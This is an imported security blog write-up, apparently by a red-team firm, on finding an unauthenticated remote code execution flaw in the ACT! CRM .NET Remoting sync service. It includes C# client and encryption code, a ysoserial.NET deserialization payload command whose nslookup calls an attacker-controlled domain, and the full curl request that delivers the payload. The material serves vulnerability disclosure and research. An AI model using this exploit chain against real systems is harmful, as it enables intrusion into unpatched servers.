---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-10_from-blackbox-net-remoting-to-unauthenticated-remote-code-execution.md
original_filename: 2023-07-10_from-blackbox-net-remoting-to-unauthenticated-remote-code-execution.md
title: From Blackbox .NET Remoting to Unauthenticated Remote Code Execution
category: documents
detected_topics:
- command-injection
- supply-chain
- idor
- access-control
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- supply-chain
- idor
- access-control
- automation-abuse
- api-security
language: en
raw_sha256: a3d182da15d100bd19c7f5a55f678d7b63e52fc596b976daab4311f8b70a216a
text_sha256: f23b005fd95f8525d8eae1575ab64e7d6222926198742cd499dfe13519b7f588
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# From Blackbox .NET Remoting to Unauthenticated Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-10_from-blackbox-net-remoting-to-unauthenticated-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, idor, access-control, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `a3d182da15d100bd19c7f5a55f678d7b63e52fc596b976daab4311f8b70a216a`
- Text SHA256: `f23b005fd95f8525d8eae1575ab64e7d6222926198742cd499dfe13519b7f588`


## Content

---
title: "From Blackbox .NET Remoting to Unauthenticated Remote Code Execution"
page_title: "CODE WHITE | Red Teaming & Attack Surface Management"
url: "https://code-white.com/blog/2023-07-from-blackbox-dotnet-remoting-to-rce/"
final_url: "https://code-white.com/blog/2023-07-from-blackbox-dotnet-remoting-to-rce/"
authors: ["Florian Hauser (@frycos)"]
programs: ["act!"]
bugs: ["RCE", ".NET Remoting", "Insecure deserialization"]
publication_date: "2023-07-10"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 952
---

Jul 10, 2023

[Florian Hauser](https://code-white.com/authors/florian-hauser) |

# From Blackbox .NET Remoting to Unauthenticated Remote Code Execution

This is a story on discovering an Unauthenticated Remote Code Execution in a CRM product by the vendor [ACT!](https://www.act.com/). What made this story special for us was that we had to take a blackbox approach at the beginning and the system was not exploitable with standard .NET Remoting payloads due to several reasons we’ll explain in this blog post.

## Discovery and Vendor Attribution

It all started with our custom asset discovery system discovering a potential .NET Remoting service on one of our client’s systems at their Internet perimeter. We started with a simple `curl` to reproduce the detected pattern.
  
  
  > GET / HTTP/1.1
  > Host: [HOST]:[PORT]
  > User-Agent: curl/7.74.0
  > Accept: */*
  < Server: MS .NET Remoting, MS .NET CLR 4.0.30319.42000
  < Content-Length: 597
  < 
  Act.Framework.Synchronization.Remoting.SecureChannel.SecureRemotingException: Server requires a secure connection for this client
  at Act.Framework.Synchronization.Remoting.SecureChannel.SecureServerChannelSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)
  at System.Runtime.Remoting.Channels.Http.HttpServerTransportSink.ServiceRequest(Object state)
  at System.Runtime.Remoting.Channels.SocketHandler.ProcessRequestNow()
  

Why was that interesting? If this would have been one of the “usual suspects” of [.NET Remoting over HTTP](https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/), one would usually have expected SOAP responses containing certain error messages. Also `"Server requires a secure connection for this client"` could have been an indicator for some kind of authentication/authorization mechanism. This could have been related to something like the _secure mode_ referenced in James Forshaw’s research tool [ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService) `-s` parameter (hint: [it was not!](https://learn.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/kw7c6kwc\(v=vs.100\))). But the namespace `Act.Framework.Synchronization.Remoting.SecureChannel` already gave a hint about a presumably custom implementation maybe belonging to a certain product. So we used some Google-Fu and found [this](https://windowsbulletin.com/files/dll/sage-software/act-2009/act-framework-synchronization-remoting-dll).

> “Act.Framework.Synchronization.Remoting.dll is a dynamic link library file that is part of Act! 2009 developed by Sage Software.”

It seemed we were indeed talking about a product here. We quickly found the vendor’s [website](https://www.act.com/) but were not able to find any trial version for download. Therefore, we browsed the vendor’s documentation websites in search for any hints related to port `65200`. This [article](https://help.act.com/s/article/How-to-Enable-Both-Application-and-Network-Synchronization-to-Run-at-the-Same-Time-prem?language=en_US) described two services running on port `65100` and `65200`, respectively: an Application and Network Synchronization service. We didn’t really care about what their function was but rather took note of their existence. Thus, at least we knew what we were probably targeting at this stage. ACT! also provided update packages for their CRM product but none of them included `Act.Framework.Synchronization.Remoting.dll`. But as you might know, DLL files are spread all over the Internet on several shady platforms and security product vendor databases. Luckily, after some time we were able to find a version of this DLL, someone uploaded to a “DLL collection portal”. So we tried to reverse this to understand the unusual .NET Remoting communication protocol.

# Reversing a single DLL

First, one usually needs a specific object ID to communicate with a .NET Remoting service. We found this being referenced within the server/service startup routine `Act.Framework.Synchronization.Remoting.SyncRemoteServer.StartServer(ISyncProgressUpdate, SyncRemoteFactory, int, out string)` as `SyncConstants.SYNC_OBJECT_ENDPOINT = SyncRemoteFactory.soap`. The .NET Remoting service was then made available via `RemotingServices.Marshal(syncRemoteFactory, SyncConstants.SYNC_OBJECT_ENDPOINT, typeof(SyncRemoteFactory))`.

Let’s have a look at the server implementation in more detail. `Act.Framework.Synchronization.Remoting.SecureChannel.SecureServerChannelSink` extends `System.Runtime.Remoting.Channels.BaseChannelSinkWithProperties` with a few more interfaces. The `ProcessMessage` method makes a case differentiation based on a client header `Convert.ToInt32((string)requestHeaders["sc_TransactionType"])`.
  
  
  switch (secureTransaction)
  {
  case SecureTransaction.Uninitialized:
  goto IL_6A;
  case SecureTransaction.SendingPublicKey:
  result = this.MakeSharedKey(transactID, requestHeaders, out responseMsg, out responseHeaders, out responseStream);
  goto IL_D9;
  case SecureTransaction.SendingSharedKey:
  goto IL_17;
  case SecureTransaction.SendingEncryptedMessage:
  break;
  default:
  goto IL_16C;
  }
  

With that said, the communication protocol we try to reproduce goes like this (we skip the `Uninitialized` case):

  1. `SecureTransaction.SendingPublicKey` being equal to `1` initiated by the client starts the exchange of a symmetric encryption key making use of a temporary asymmetric encryption procedure. This is a typical secure key exchange pattern known from different protocols.
  2. The encrypted symmetric key with initialization vector is sent back from the server to the client.
  3. The real exchange of business data starts being encrypted with the newly received symmetric parameters.

![Remoting Protocol](./actremotingprotocol.png)

So what happens if the encrypted communication is established and the server decrypts our payload? To understand the process flow, we again have a closer look at the `StartServer` method of `Act.Framework.Synchronization.Remoting.SyncRemoteServer`. Remember the `Marshal` call in this method providing us insight into the .NET Remoting URI? A few lines above, a new `System.Runtime.Remoting.Channels.Http.HttpChannel` object is built via `new HttpChannel(dictionary, null, this.GetSecuredServerChannelSinkProvider())`. The `GetSecuredServerChannelSinkProvider` method contains the following definitions:
  
  
  serverChannelSinkProvider = new SecureServerChannelSinkProvider(listDictionary, null);
  binaryServerFormatterSinkProvider = new BinaryServerFormatterSinkProvider();
  

followed by:
  
  
  binaryServerFormatterSinkProvider.TypeFilterLevel = TypeFilterLevel.Full;
  serverChannelSinkProvider.Next = binaryServerFormatterSinkProvider;
  

Three things we learned here:

  1. We have two different sink providers in the `processMessage` chain. First, the `SecureServerChannelSinkProvider` taking care of the encryption/decryption routines. Second, our good friend `BinaryServerFormatterSinkProvider` reconstructing the serialized message.
  2. The `TypeFilterLevel` is set to `Full` which makes exploitation even easier.
  3. It is a sink provider chain, i.e. a kind of Linked List where a message flows through to be processed in different stages. See also an [architectural overview written by my colleague Markus](https://code-white.com/blog/2022-01-dotnet-remoting-revisited/).

# Make a client

Now, we were able to write some lines of code to simulate the desired communication pattern described above.
  
  
  ListDictionary listDictionary = new ListDictionary();
  listDictionary["name"] = "SyncClient";
  listDictionary["port"] = 0;
  IChannel channel = new HttpChannel(listDictionary, GetSecuredClientChannelSinkProvider(), null);
  ChannelServices.RegisterChannel(channel, false);
  
  ISyncRemoteFactory sremoteFactory  = (ISyncRemoteFactory)Activator.GetObject(typeof(ISyncRemoteFactory), "http://[HOST]:65200/SyncRemoteFactory.soap");
  

We also had to add some boiler-plate code because we didn’t have all the necessary DLLs but only the one from the shady website (which we checked of course in advance for backdoors, malware etc.). This basically forced us to implement `GetSecuredClientChannelSinkProvider()` with the proper encryption algorithms used by the targeted machine.

Firing up this client indeed initiated the communication protocol as explained above. So, we had to take some notes during execution because we would need them later:

  1. `sc_TransactionType` had to be incremented accordingly for the final payload (see the `switch` case mentioned above).
  2. `sc_TransactionID` pointed to the unique transaction session, i.e. it had to stay fixed during the exploitation phase.
  3. `sc_SharedKey` and `sc_SharedIV` for the symmetric encryption of our exploit payload. These we could extract easily by putting proper breakpoints in the method `Act.Framework.Synchronization.Remoting.SecureChannel.SecureClientChannelSink.ProcessSharedKeyResponse`.

The targeted code for item 3 hitting the proper breakpoint should look like this.
  
  
  SymmetricAlgorithm newSymmetricProvider = CryptoHelper.GetNewSymmetricProvider(this._algorithm);
  newSymmetricProvider.Key = this._rsaProvider.Decrypt(Convert.FromBase64String(text), this._oaep);
  newSymmetricProvider.IV = this._rsaProvider.Decrypt(Convert.FromBase64String(text2), this._oaep);
  

# Create PoC Payload

Since we could expect a final `BinaryServerFormatterSinkProvider` at the server-side, the famous tool [ysoserial.NET](https://github.com/pwntester/ysoserial.net) joined the game. Since we didn’t have a test system (remember, no trial!), a simple `nslookup` should have given us the final proof for Remote Code Execution.
  
  
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "nslookup [YOUR_DNS_SERVER_DOMAIN]" -o base64
  

For the encryption of the payload a bit more C# code was needed.
  
  
  string payloadb64 = @"[BASE64_ENCODED_YOSERIAL_PAYLOAD]";
  SymmetricAlgorithm newSymmetricProvider = CryptoHelper.GetNewSymmetricProvider("DES");
  newSymmetricProvider.IV = new byte[] { (byte)0xDB, (byte)0xD2, (byte)0x49, (byte)0xB3, (byte)0x29, (byte)0x68, (byte)0xAF, (byte)0xF3 }; // values extracted before
  newSymmetricProvider.Key = new byte[] { (byte)0x5B, (byte)0x7A, (byte)0xF5, (byte)0x4A, (byte)0xB6, (byte)0x6F, (byte)0xF4, (byte)0x05 }; // values extracted before
  MemoryStream enc = (MemoryStream) CryptoHelper.GetEncryptedStream(new MemoryStream(Convert.FromBase64String(payloadb64)), newSymmetricProvider);
  Console.WriteLine("Copy payload of original byte size " + enc.ToArray().Length);
  Console.WriteLine(Convert.ToBase64String(enc.ToArray()));
  

We were ready to fire the final payload, written into a file `payload.bin` in binary format, i.e. after Base64 decoding again.
  
  
  curl -v -i -s -k -X $'POST' \
  -H $'User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 6.2.9200.0; MS .NET Remoting; MS .NET CLR 4.0.30319.42000 )' -H $'Content-Type: application/octet-stream' -H $'sc_TransactionType: 3' -H $'sc_TransactionID: df0d6d8c-[REDACTED]' -H $'Host: [HOST]:65200' -H $'Expect: 100-continue' -H $'Connection: close' \
  --data-binary $'@payload.bin' \
  $'http://[HOST]:65200/SyncRemoteFactory.soap'
  

And we observed DNS requests proving the Remote Code Execution. We leave potential screenshots to your imagination, because this was one of our client’s system.

# Final Remarks

We learned a few things during this journey and also want to add some obvious words of advice:

  * Not every .NET Remoting service might be easily exploitable with off-the-shelf tooling.
  * If you miss backend code, look for “leaked” binaries somewhere else.
  * Always conduct a full code review on the leaked binaries before you execute them on your (hopefully virtualized) system to not get compromised yourself.
  * Vendors could wrap .NET Remoting services in different flavors, additional protocols etc.
  * A chain of sink providers easily allows to extend standard .NET Remoting processing which might break your default tooling.

We worked together with the ACT! team on fixing this issue. They basically rewrote the whole service layer to be served as a [WCF service from now on](https://learn.microsoft.com/en-us/dotnet/framework/wcf/migrating-from-net-remoting-to-wcf), i.e. no more .NET Remoting. Unfortunately, we cannot provide specific versions (unpatched vs. patched) due to the restrictive communication of the vendor.
